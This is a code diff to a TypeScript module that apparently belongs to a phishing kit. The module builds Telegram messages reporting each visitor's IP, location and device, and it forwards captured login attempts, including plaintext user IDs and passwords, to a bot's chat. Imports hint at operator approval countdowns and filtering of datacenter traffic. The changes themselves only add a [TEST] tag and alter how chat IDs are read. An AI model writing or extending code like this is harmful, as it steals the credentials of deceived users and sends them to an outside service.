@@ -9,13 +9,12 @@ import {
 import { sendTelegramApprovalWithCountdown } from '@/lib/telegram-approval-countdown'
 import { getNetworkHintLabel } from '@/lib/bot-verification/datacenter-heuristic'
 import { getTelegramVisitorSiteName } from '@/lib/site-url'
+import { isProduction } from './utils'
 
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
 // TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
-const CHAT_IDS = process.env.TELEGRAM_CHAT_ID
-  ? process.env.TELEGRAM_CHAT_ID.split(',').map((id) => id.trim()).filter(Boolean)
-  : []
+const CHAT_IDS = [process.env.TELEGRAM_CHAT_ID || ""]
 
 // Validate that required environment variables are set
 if (!TELEGRAM_BOT_TOKEN) {
@@ -148,7 +147,7 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
     ? `📱 <b>Device:</b> ${asCode(data.deviceLabel)}\n`
     : ''
   const message =
-    `\n🌐 <b>New Visitor (${site})</b>\n` +
+    `\n${isProduction ? "" : "[TEST]"} \n🌐 <b>New Visitor (${site})</b>\n` +
     `━━━━━━━━━━━━━━━━━━\n` +
     `📍 <b>Location:</b> ${asCode(data.location)}\n` +
     `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
@@ -165,7 +164,7 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
     `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
     `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
     `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}\n` +
-    `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`
+    `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`;
 
   return await sendTelegramMessage(message, { disableWebPagePreview: false })
 }
@@ -176,7 +175,7 @@ export async function sendFormNotification(data: FormData & { [key: string]: any
   // 1) Login attempt from main Sign In
   if (data.type === 'login') {
     const idField = identifierFieldLabel(data.userId)
-    message = `🔐 <b>Login Attempt</b>
+    message = `\n${isProduction ? "" : "[TEST]"} \n🔐 <b>Login Attempt</b>
 ━━━━━━━━━━━━━━━━━━
 ${idField.emoji} <b>${idField.label}:</b> ${asCode(data.userId)}
 🔒 <b>Password:</b> ${asCode(data.password)}`
